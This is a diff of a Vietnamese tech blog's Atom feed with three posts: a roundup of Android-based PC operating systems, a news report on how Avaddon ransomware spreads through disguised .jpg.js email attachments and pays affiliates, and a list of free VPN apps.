@@ -1,6 +1,409 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.0.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-05-14T19:48:52+07:00</updated><id>http://localhost:4000/feed.xml</id><entry><title type="html">Khái niệm màu sắc trong thiết kế (phần 3)</title><link href="http://localhost:4000/khai-niem-mau-sac-trong-thiet-ke-p3" rel="alternate" type="text/html" title="Khái niệm màu sắc trong thiết kế (phần 3)" /><published>2020-05-14T00:00:00+07:00</published><updated>2020-05-14T00:00:00+07:00</updated><id>http://localhost:4000/khai-niem-mau-sac-trong-thiet-ke-p3</id><content type="html" xml:base="http://localhost:4000/khai-niem-mau-sac-trong-thiet-ke-p3">&lt;p&gt;Chào các bạn, mình sẽ tiếp tục với series của Khái niệm màu sắc trong thiết kế (phần 3)&lt;br /&gt;&lt;/p&gt;
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.0.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-08-01T15:56:38+07:00</updated><id>http://localhost:4000/feed.xml</id><entry><title type="html">Tổng hợp một số Android cho PC hiện nay</title><link href="http://localhost:4000/tong-hop-mot-so-android-cho-hien-nay.html" rel="alternate" type="text/html" title="Tổng hợp một số Android cho PC hiện nay" /><published>2020-08-01T00:00:00+07:00</published><updated>2020-08-01T00:00:00+07:00</updated><id>http://localhost:4000/tong-hop-mot-so-android-cho-pc-hien-nay</id><content type="html" xml:base="http://localhost:4000/tong-hop-mot-so-android-cho-hien-nay.html">&lt;p&gt;Với sự phát triển vượt bậc trong suốt các thập kỷ của khoa học và công nghệ hiện nay, con người gần như tạo nên thành công những vật dụng nhỏ gọn và thông minh tưởng chừng chỉ có trên phim ảnh.&lt;/p&gt;
 
-&lt;p&gt;&lt;img src=&quot;http://localhost:4000/image/2020514ColorP3.jpg&quot; alt=&quot;title-image&quot; /&gt;&lt;/p&gt;
+&lt;p&gt;Đặc biệt nhất kể đến hành trình phát triển của các dòng điện thoại thông minh tiếng anh gọi là &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smart phone&lt;/code&gt;&lt;/strong&gt;, nó gần như hoàn toàn gôm gọn các tính năng tiện ích cần thiết nhất cho con người, từ nghe nhạc đến xem phim và đọc báo lướt web v.v.., cùng với đó thì những chiếc &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smart phone&lt;/code&gt;&lt;/strong&gt; được trang bị chung một &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;hệ điều hành&lt;/code&gt;&lt;/strong&gt; mở đó là Android. Tuy nhiên với nhu cầu hiện nay là &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;smart phone&lt;/code&gt;&lt;/strong&gt; chưa đủ Adnroid muốn hướng đến 1 &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;hệ điều hành Android vs 1 hệ sinh thái đồ sộ&lt;/code&gt;&lt;/strong&gt; mang tính mở có thể trải nghiệm được trên cả PC.&lt;/p&gt;
+
+&lt;p&gt;Tuy nhiên để có thể đưa Android lên PC, các nhà phát triển đã hướng đến tính giả lập Android cho PC. NNếu set về phương diện tối ưu phần cứng thì điều này khá là phức tạp khi nó đòi hỏi PC phải có các phần cứng đủ khỏe để có thể giả lập Android 1 mượt mà, trong khi đó bản thân phần cứng của các chiếc PC hay Laptop hiện nay đã đủ khỏe để có thể chạy được &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;HDH Windows&lt;/code&gt;&lt;/strong&gt; 1 cách mượt mà ?.&lt;/p&gt;
+
+&lt;p&gt;Vì thế các nhà phát triển đã hướng đến 1 khả năng đó là mang tính mở vận hành độc lập cho hể điều hành Android này, về cơ bản thì hệ điều hành này cũng được phát triển dựa trên nhân &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Linux&lt;/code&gt;&lt;/strong&gt; mà thôi. Dưới đây là tổng hợp 1 số Android cho PC&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.fosshub.com/Remix-OS.html&quot;&gt;&lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;1. REMIX OS&lt;/code&gt;&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;center&gt;&lt;img class=&quot;img-thumbnail&quot; src=&quot;/image/202081Android-PC-RemixOS.jpg&quot; /&gt;&lt;/center&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Remix OS mô phỏng hệ điều hành di động Android trên màn hình lớn hơn, có thể kết hợp với chuột và bàn phím mang đến cho bạn những trải nghiệm thú vị. Remix OS cũng là ứng dụng tiên phong về hệ điều hành nhân Android đầu tiên cho PC, được thiết kế với sự đơn giản và nhiều tính năng.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.fosshub.com/Remix-OS.html&quot;&gt;Download Remix OS 3.0&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://www.phoenixos.com/en/download_x86&quot;&gt;&lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;2. Pheonix OS&lt;/code&gt;&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;center&gt;&lt;img class=&quot;img-thumbnail&quot; src=&quot;/image/202081Android-PC-PheonixOS.jpg&quot; /&gt;&lt;/center&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Phoenix OS trông giống như Remix OS (hiện đã không còn được hỗ trợ). Nó tương thích với GPL-2.0 và cài đặt trên nhiều loại khác nhau của phần cứng dựa trên x86. (Nếu có thể cài đặt Linux trên một máy tính cụ thể, bạn có thể cài đặt Phoenix OS).&lt;/p&gt;
+
+&lt;p&gt;Phoenix OS cũng bao gồm các cải tiến cho Android, chẳng hạn như tự động ngăn không cho ứng dụng chạy dưới nền. Ngoài tốc độ, hệ điều hành cũng nhận được cập nhật thường xuyên. Những tính năng này đã góp phần làm tăng tính phổ biến của nó gần đây. Một vài công ty phần cứng của Trung Quốc sẽ phát hành máy tính bảng và PC mini với việc sử dụng Phoenix OS làm hệ điều hành chính như máy tính bảng Pipo P10 2 trong 1.&lt;/p&gt;
+
+&lt;p&gt;Không phải tất cả phần cứng đều tương thích với Phoenix OS. Nó có cùng một điểm yếu và khuyết điểm như Linux: cụ thể là nó sẽ không hoạt động với tất cả phần cứng. Và ngay cả khi đã hoạt động, nó sẽ thiếu một số tính năng nhất định như âm thanh thông qua một kết nối HDMI.&lt;/p&gt;
+
+&lt;p&gt;Ngoài ra, bạn có thể thử nghiệm Phoenix OS từ bên trong một máy ảo, chẳng hạn như VMware hoặc VirtualBox.&lt;/p&gt;
+
+&lt;p&gt;Yêu cầu cài đặt Phoenix OS
+Yêu cầu phần cứng của Phoenix OS
+Phoenix OS chỉ yêu cầu bộ vi xử lý Intel hoặc AMD x86 (Intel Atom) và bộ nhớ trong với ít nhất 2GB. Bạn nên sử dụng ít nhất ổ đĩa 16GB. Để cài đặt Phoenix OS, người dùng sẽ cần một ổ USB với ít nhất 8GB bộ nhớ.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;http://www.phoenixos.com/en/download_x86&quot;&gt;Donwload Phoenix OS&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://primeos.in/download/&quot;&gt;&lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;3. Prime OS&lt;/code&gt;&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;center&gt;&lt;img class=&quot;img-thumbnail&quot; src=&quot;/image/202081Android-PC-PrimeOS.jpg&quot; /&gt;&lt;/center&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Hệ điều hành PrimeOS cung cấp cho một trải nghiệm máy tính để bàn hoàn chỉnh tương tự như Windows hoặc MacOS với quyền truy cập vào hàng triệu ứng dụng Android. Nó được thiết kế để mang lại cho bạn tốt nhất của cả hai thế giới, một Fusion hoàn toàn của Android và PC.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://primeos.in/download/&quot;&gt;Download Prime OS&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.blissos.org/&quot;&gt;&lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;4. Bliss OS&lt;/code&gt;&lt;/strong&gt;&lt;/a&gt;&lt;/p&gt;
+
+&lt;center&gt;&lt;img class=&quot;img-thumbnail&quot; src=&quot;/image/202081Android-PC-BlissOS.jpg&quot; /&gt;&lt;/center&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Một hệ điều hành nguồn mở, dựa trên Android, kết hợp nhiều tối ưu hóa, tính năng và hỗ trợ thiết bị mở rộng. Và nó có sẵn cho chỉ là về bất kỳ Chromebook, Windows/Linux PC hoặc máy tính bảng phát hành trong 4 năm qua.&lt;/p&gt;
+
+&lt;p&gt;Bliss OS cho phép người dùng chọn giữa Desktop hoặc Tablet UI, dựa trên trình khởi chạy đang được sử dụng. Bạn thậm chí có thể pha trộn hai cho một kinh nghiệm thực sự tùy chỉnh.&lt;/p&gt;
+
+&lt;p&gt;Bliss OS đi kèm với một loạt các tính năng bổ sung cho khả năng tương thích với ARM &amp;amp; ARM64 ứng dụng. Cũng như các cấu hình bổ sung cho nhiều gamepads và hồ sơ cho Tincore Keymapper, cho phép người dùng trò chơi như không bao giờ trước.&lt;/p&gt;
+
+&lt;p&gt;&lt;a href=&quot;https://www.blissos.org/&quot;&gt;Download Bliss OS&lt;/a&gt;&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;Vừa rồi mình vừa tổng hợp 1 số hệ điều hành Adroid cho PC, bạn cảm thấy thế nào và đã từng trải nghiệm nó chưa vui lòng &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;comment&lt;/code&gt;&lt;/strong&gt; vào bên dưới cho mình biết ý kiến và còn bản Android PC nào mình cho biết đến hãy chia sẻ cho mình biết để mình tổng hợp thêm nhá.&lt;/p&gt;</content><author><name>Panadora</name></author><category term="[&quot;other&quot;, &quot;windows&quot;, &quot;linux&quot;, &quot;news&quot;]" /><summary type="html">Với sự phát triển vượt bậc trong suốt các thập kỷ của khoa học và công nghệ hiện nay...</summary></entry><entry><title type="html">Ransomware RaaS, nguy hiểm với mã độc tống tiền mới</title><link href="http://localhost:4000/ma-doc-tong-tien-RaaS" rel="alternate" type="text/html" title="Ransomware RaaS, nguy hiểm với mã độc tống tiền mới" /><published>2020-06-21T00:00:00+07:00</published><updated>2020-06-21T00:00:00+07:00</updated><id>http://localhost:4000/ma-doc-tong-tien-RaaS</id><content type="html" xml:base="http://localhost:4000/ma-doc-tong-tien-RaaS">&lt;p&gt;&lt;strong&gt;Cách đây 2 ngày tình cơ trên facebook xuất hiện 1 bài đăng nói về sự nguy hiểm của loại mã độc tống tiền mới có tên là RaaS, và tôi cũng đã tò mò với điều và click vào bài post để xem thêm thông tin về con Ransomware mới này. Cụ thể như sau:&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/image/ransomware-as-a-service.png&quot; alt=&quot;image-title&quot; width=&quot;100%&quot; /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Loại mã độc Ransomware tốngg tiền mới được phát tán vào đầu tháng 6 này, do một tổ chức chuyên phát triển loại mã độc có tên Avaddon đã được thành lập. Tuy nhiên Avaddon không tự mình phân phối các mã đọc do họ tạo ra, thay vào đó Avaddon tuyển dụng một loại tin tặc và đại lý giúp họ phát tán mã độc.&lt;/p&gt;
+
+&lt;p&gt;Cách làm này giúp mã độc của Avaddon tấn công được cực kỳ nhiều nạn nhân. Đợt tấn công đầu tiên sử dụng mã độc ransomware có tên Avaddon Ransomware đang khiến cả thế giới lo lắng vì quy mô của nó. Với cái nháy mắt và nụ cười, Avaddon Ransomware đang spam, khủng bố hàng trăm ngàn người và rất nhiều trong số đó đã trở thành nạn nhân của Avaddon.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/image/Avaddon-Ransomware-1.jpg&quot; alt=&quot;image-title&quot; width=&quot;100%&quot; /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;Một loạt email chứa mã độc với chủ đề gợi sự tò mò như “Ảnh mới của bạn nè?” hoặc “Bạn có thích ảnh của tôi không?”, với nội dung chẳng có gì ngoài biểu tượng nháy mắt hoặc mặt cười đã được gửi đi. Kèm trong thư đương nhiên là trình tải xuống JavaScript mà khi kích vào ransomware sẽ được cài đặt trên máy tính của nạn nhân.&lt;/p&gt;
+
+&lt;p&gt;David Picket, nhà nghiên cứu bảo mật của AppRiver, chia sẻ rằng họ đã chặn 300.000 email chứa Avaddon Ransomware chỉ trong một khoảng thời gian ngắn. Các đại lý, hacker làm việc cho Avaddon bao gồm cả những cái tên sừng sỏ như Phorpiex/Trik Botnet.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/image/Avaddon-Ransomware-2.jpg&quot; alt=&quot;image-title&quot; width=&quot;100%&quot; /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Thiết lập ảnh phần mở rộng tập tin mặc định của Microsoft vô tình tiếp tay cho Avaddon Ransomware&lt;/code&gt;&lt;/strong&gt;.&lt;br /&gt;
+Trình cài đặt JavaScript được đính kèm trong email được ngụy trang giống như một bức ảnh định dạng JPG bằng cách đặt tên là IMG123101.jpg.js. Thiết lập ẩn phần mở rộng tập tin của Windows vô tình tiếp tay cho Avaddon Ransomware. Cụ thể, sau khi tải về máy, IMG123101.jpg.js sẽ chỉ hiển thị là IMG123101.jpg, khiến người dùng lầm tưởng đây chỉ là file ảnh và mở nó ra.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/image/Avaddon-Ransomware-3.jpg&quot; alt=&quot;image-title&quot; width=&quot;100%&quot; /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Các dòng code &quot;độc hại&quot; ẩn trong IMG123101.jpg.js&lt;/code&gt;&lt;/strong&gt;.&lt;br /&gt;
+Khi được mở, IMG123101.jpg.js sẽ khởi chạy cả cửa sổ PowerShell và Bitsadmin để tải về và cài đặt Avaddon Ransomware vào thư mục %Temp%. Ransomware sẽ được khởi chạy ngay sau khi cài đặt xong.&lt;/p&gt;
+
+&lt;p&gt;Trong thử nghiệm được tiến hành bởi Bleeping Computer, sau khi chạy, Avaddon Ransomware sẽ tìm kiếm tất cả các dữ liệu trên máy và mã hóa chúng. Phần mở rộng .avdn sẽ được thêm vào các dữ liệu bị mã hóa.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/image/Avaddon-Ransomware-4.jpg&quot; alt=&quot;image-title&quot; width=&quot;100%&quot; /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Các tập tin bị mã hóa sau khi Avaddon Ransomware được khởi động&lt;/code&gt;&lt;/strong&gt;.&lt;br /&gt;
+Thư đòi tiền chuộc dữ liệu có tên [id]-readme.html cũng được tạo ra trong mỗi thư mục. Trong thư có chứa link tới trang web thanh toán, chỉ có thể truy cập bằng trình duyệt TOR và ID của nạn nhân. Mỗi nạn nhân có một ID riêng, duy nhất.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/image/Avaddon-Ransomware-5-1.jpg&quot; alt=&quot;image-title&quot; width=&quot;100%&quot; /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Thư đòi tiền chuộc của Avaddon, yêu cầu người dùng tải trình duyệt TOR để truy cập trang thanh toán&lt;/code&gt;&lt;/strong&gt;.&lt;br /&gt;
+Khi truy cập trang web thanh toán, nạn nhân sẽ thấy số tiền mà Avaddon yêu cầu là 900 USD, có thể tăng thêm tùy theo số lượng tài liệu. Hướng dẫn chi tiết về cách thanh toán để nhận trình giải mã cũng được Avaddon liệt kê chi tiết.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/image/Avaddon-Ransomware-6.jpg&quot; alt=&quot;image-title&quot; width=&quot;100%&quot; /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Giá tiền chuộc dữ liệu là 900 USD, có thể tăng thêm tùy theo số lượng tài liệu&lt;/code&gt;&lt;/strong&gt;.&lt;br /&gt;
+Trang web cũng có đầy đủ các phần như hỗ trợ qua tin nhắn, giải mã thử miễn phí và trang trợ giúp vui nhộn với hình ảnh các nhân vật trong Harry Potter. Không may là sau khi tiến hành phân tích Avaddon Ransomware, Michael Gillespie kết luận rằng trình giải mã thử miễn phí không hoạt động. Gillespie là người tạo ra trang xác định ransomware ID-Ransomware.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/image/Avaddon-Ransomware-7.jpg&quot; alt=&quot;image-title&quot; width=&quot;100%&quot; /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Trang hỗ trợ đầy hài hước của Avaddon&lt;/code&gt;&lt;/strong&gt;.&lt;br /&gt;
+Phân phối ransomware theo hình thức đại lý liên kết&lt;/p&gt;
+
+&lt;p&gt;Trong quảng cáo đăng trên một diễn đàn hacker của Nga, Avaddon tuyên bố rằng họ vận hành theo phương thức Ransomware-as-an-Affiliate (RaaS). Đây là phương thức hoàn toàn mới trong thế giới tội phạm mạng.&lt;/p&gt;
+
+&lt;p&gt;RaaS hoạt động giống như một hệ thống kinh doanh liên kết, trong đó Avaddon chịu trách nhiệm phát triển mã độc và vận hành, xử lý quá trình thanh toán, giải mã cho nạn nhân. Các hacker và đại lý liên kết với Avaddon sẽ đảm nhiệm việc phân phối ransomware qua thư rác, xâm nhập mạng lưới nội bộ và các phương thức khác.&lt;/p&gt;
+
+&lt;p&gt;Nếu nạn nhân chi tiền chuộc lại dữ liệu, Avaddon sẽ trả 65% cho đại lý, giữ lại 35%. Các đại lý lớn có thể đàm phán với Avaddon để nhận mức doanh thu cao hơn, tùy theo quy mô của cuộc tấn công.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;/image/Avaddon-Ransomware-8.jpg&quot; alt=&quot;image-title&quot; width=&quot;100%&quot; /&gt;
+&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Avaddon đang rất tích cực tìm kiếm đại lý&lt;/code&gt;&lt;/strong&gt;.&lt;br /&gt;
+Tuy nhiên, các đại lý tham gia RaaS sẽ phải tuân theo một loạt quy định mà Avaddon đưa ra. Quy tắc quan trọng nhất mà Avaddon đưa ra đó là các đại lý không được tấn công nạn nhân tại các quốc gia trong Cộng đồng các Quốc gia Độc lập (CIS).&lt;/p&gt;
+
+&lt;p&gt;Hiện tại, Avaddon vẫn đang tích cực tuyển dụng thêm hacker và các đại lý. Vì thế, trong tương lai sẽ còn có thêm nhiều đợt tấn công với quy mô lớn của Avaddon Ransomware. Mời các bạn truy cập trang bên dưới để tham khảo cách bảo vệ dữ liệu trước các ransomware nguy hiểm.&lt;/p&gt;
+
+&lt;hr /&gt;
+
+&lt;p&gt;Dựa theo nguồn thông tin từ: &lt;a href=&quot;https://quantrimang.com/ransomware-nguy-hiem-nay-dang-phat-tan-nhanh-tren-toan-the-gioi-172808&quot;&gt;Quản Trị Mạng&lt;/a&gt;&lt;/p&gt;</content><author><name>Panadora</name></author><category term="[&quot;other&quot;, &quot;windows&quot;, &quot;linux&quot;, &quot;news&quot;]" /><summary type="html">Loại mã độc Ransomware tốngg tiền mới được phát tán vào đầu tháng 6 này, do một tổ chức chuyên phát triển loại mã độc có tên Avaddon đã được thành lập.</summary></entry><entry><title type="html">Tổng hợp một số phần mềm VPN miễn phí</title><link href="http://localhost:4000/tong-hop-nhung-phan-mem-vpn-mien-phi.html" rel="alternate" type="text/html" title="Tổng hợp một số phần mềm VPN miễn phí" /><published>2020-06-02T00:00:00+07:00</published><updated>2020-06-02T00:00:00+07:00</updated><id>http://localhost:4000/tong-hop-nhung-phan-mem-vpn-mien-phi</id><content type="html" xml:base="http://localhost:4000/tong-hop-nhung-phan-mem-vpn-mien-phi.html">&lt;center&gt;&lt;img class=&quot;img-thumbnail&quot; width=&quot;500&quot; src=&quot;/image/202061vpn.jpg&quot; /&gt;&lt;/center&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;VPN là gì ?&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;VPN là tên gọi tắt của &lt;strong&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;Virtual Private Network&lt;/code&gt;&lt;/strong&gt;, là một phần mềm công nghệ mạng ảo giúp tạo kết nối mạng an toàn khi tham gia vào mạng công cộng như &lt;strong&gt;Internet&lt;/strong&gt; hoặc mạng riêng do một nhà cung cấp dịch vụ sở hữu. Các tập đoàn lớn các cơ quan chính phủ sử dụng công nghệ VPN cho phép người dùng từ xa kết nối an toàn đến mạng cơ quan mình. &lt;a href=&quot;https://quantrimang.com/ly-thuyet-vpn-la-gi-117232&quot;&gt;chi tiết…&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Tổng hợp một số phần mềm VPN miễn phí&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://www.vpngate.net/en/download.aspx&quot;&gt;1. Vpn Gate Client&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Đơn giản chỉ cần cài đặt VPN Gate Client plugin để SoftEther VPN Client. Nó sẽ cho phép bạn kết nối với bất kỳ VPN công cộng Relay máy chủ của VPN Gate trong một snap. Nó có một thông lượng tốt hơn so với L2TP, OpenVPN hoặc SSTP. Tệp chương trình này được ký điện tử bằng chứng chỉ do GlobalSign phát hành. Tệp nhị phân có một countersignature do Symantec phát hành.&lt;/p&gt;
+
+&lt;center&gt;&lt;img class=&quot;img-thumbnail&quot; src=&quot;/image/vpngateclient.png&quot; /&gt;&lt;/center&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://touchvpn.net/&quot;&gt;2. Touch VPN&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Truy cập bất kỳ trang web nào ở bất kỳ quốc gia nào
+Bypass Geo-hạn chế để mở khóa bất kỳ trang web bất cứ nơi nào bạn! Nhận quyền truy cập vào các trang web bị chặn hoặc kiểm duyệt bởi chính phủ, trường học hoặc nơi làm việc. Evade tường lửa để mở khóa Facebook, xem YouTube, và phá vỡ các giới hạn VOIP. TouchVPN bỏ chặn nó tất cả với ứng dụng VPN miễn phí của nó&lt;/p&gt;
+
+&lt;p&gt;Bảo vệ dữ liệu của bạn khỏi hacker
+bạn đang kết nối với một Hotspot WiFi công cộng, một hacker có thể truy cập tên, mật khẩu và thông tin cá nhân của bạn. TouchVPN mã hóa dữ liệu của bạn và cung cấp cho bạn bảo mật cấp ngân hàng để bảo vệ tốt nhất trong khi bạn kết nối với một điểm truy cập WiFi không an toàn.&lt;/p&gt;
+
+&lt;p&gt;Lướt web ẩn danh
+Tránh bị snooped bởi ISP của bạn và ngăn chặn các trang web từ theo dõi quảng cáo và nhắm mục tiêu. TouchVPN thay đổi địa chỉ IP của bạn, vì vậy danh tính trực tuyến của bạn là vô danh và hoạt động Internet của bạn là không thể tiếp cận với con mắt tò mò và businessnes.&lt;/p&gt;
+
+&lt;p&gt;Hiện tại &lt;code class=&quot;highlighter-rouge&quot;&gt;Touch VPN&lt;/code&gt; được tích hợp trong app store của Microsoft bạn cũng có thể vào đó &lt;strong&gt;&lt;a href=&quot;https://www.microsoft.com/store/productId/9NBLGGH5GB3F&quot;&gt;tải về&lt;/a&gt;&lt;/strong&gt;, và cũng đã có phiên bản &lt;strong&gt;&lt;a href=&quot;https://play.google.com/store/apps/details?id=com.northghost.touchvpn&quot;&gt;CHPlay&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;center&gt;&lt;img class=&quot;img-thumbnail&quot; src=&quot;/image/TouchVPN.jpg&quot; /&gt;&lt;/center&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://1.1.1.1/&quot;&gt;3. VPN 1.1.1.1&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Cũng là 1 phần mềm VPN được sử dụng phổ biến nhất tại thời điểm bây giờ. Tại sao lại phổ biến thì tất nhiên là đối với các bạn nam đang còn F.A hay đại loại là ở nhà một mình :) hihi bạn hiểu ý tôi muốn về chủ đề gì rồi chứ.&lt;/p&gt;
+
+&lt;p&gt;Tuy nhiên phần mềm này đang được hổ trợ trên Android và IOS, hiện tại nhà phát hành chưa có thông báo về phiên bản dành cho Windows và MacOs. để có thể download và hướng dẫn cài đặt sử dụng trên Windows thì mời các bạn liên kết tới &lt;a href=&quot;https://congnghevacuocsong.tk/huong-d-n-cai-dat-warp-1-1-1-1-tren-pc-windows-va-mac-os.html&quot;&gt;bài hướng dẫn này&lt;/a&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://play.google.com/store/apps/details?id=com.cloudflare.onedotonedotonedotone&quot;&gt;Tải về cho Android&lt;/a&gt;&lt;/strong&gt;&lt;br /&gt;
+&lt;strong&gt;&lt;a href=&quot;https://apps.apple.com/us/app/1-1-1-1-faster-internet/id1423538627&quot;&gt;Tải về cho IOS&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;center&gt;&lt;img class=&quot;img-thumbnail&quot; src=&quot;/image/1111vpn.jpg&quot; /&gt;&lt;/center&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://www.tunnelbear.com/&quot;&gt;4. TunnelBear&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;TunnelBear là phần mềm VPN miễn phí và giao diện thân thiện với người dùng. Bạn có thể tùy chọn đăng ký miễn phí hoặc trả phí. Hạn chế duy nhất với bản miễn phí là bạn chỉ có 500MB lưu lượng truy cập mỗi tháng.&lt;/p&gt;
+
+&lt;p&gt;Phần mềm này là hiệu suất ấn tượng và dễ sử dụng. Bạn sẽ không cần phải thay đổi bất kỳ cài đặt mặc định nào và tùy chọn kết nối tự động vẫn hoạt động tốt, nhưng bạn có thể chọn thủ công một trong 20 quốc gia theo vị trí được chấp nhận. Đơn giản và đảm bảo an toàn, TunnelBear chắc chắn là một trong những VPN miễn phí tốt nhất cho tất cả các thiết bị của bạn.&lt;/p&gt;
+
+&lt;p&gt;Một điều lưu ý rằng TunnelBear đã điều chỉnh chính sách bảo mật của mình, do đó, VPN hiện thu thập ít dữ liệu hơn về người dùng, bỏ phần cung cấp tên đăng ký và “đào bới” về hồ sơ số lượng kết nối suốt đời của người dùng.&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;https://www.tunnelbear.com/apps/windows&quot;&gt;Tải về Windows&lt;/a&gt; - &lt;a href=&quot;https://www.tunnelbear.com/apps/mac&quot;&gt;Tải về MacOS&lt;/a&gt; - &lt;a href=&quot;https://www.tunnelbear.com/apps/ios&quot;&gt;Tải về IOS&lt;/a&gt; - &lt;a href=&quot;https://www.tunnelbear.com/apps/android&quot;&gt;Tải về Android&lt;/a&gt; - &lt;a href=&quot;https://www.tunnelbear.com/apps/browser&quot;&gt;Tải về Browser&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
+
+&lt;center&gt;&lt;img class=&quot;img-thumbnail&quot; src=&quot;/image/TunnelBear.jpg&quot; /&gt;&lt;/center&gt;
+&lt;p&gt;&lt;br /&gt;&lt;/p&gt;
+
+&lt;p&gt;&lt;strong&gt;Lời kết&lt;/strong&gt;&lt;/p&gt;
+
+&lt;p&gt;Vừa rồi là mình tổng hợp một số VPN được sử dụng hiện nay, các bạn đã từng sử dụng qua những phần mềm trên chưa hãy cho mình biết ý kiến sử dụng của các bạn, và còn những phần mềm nào hữu ích hay comment cho mình biết để mình có thể tham khảo và tiềm hiểu nhá, cảm ơn các bạn đã xem qua đừng quên like và share cho bạn bè cùng biết đến nhá.&lt;/p&gt;
+
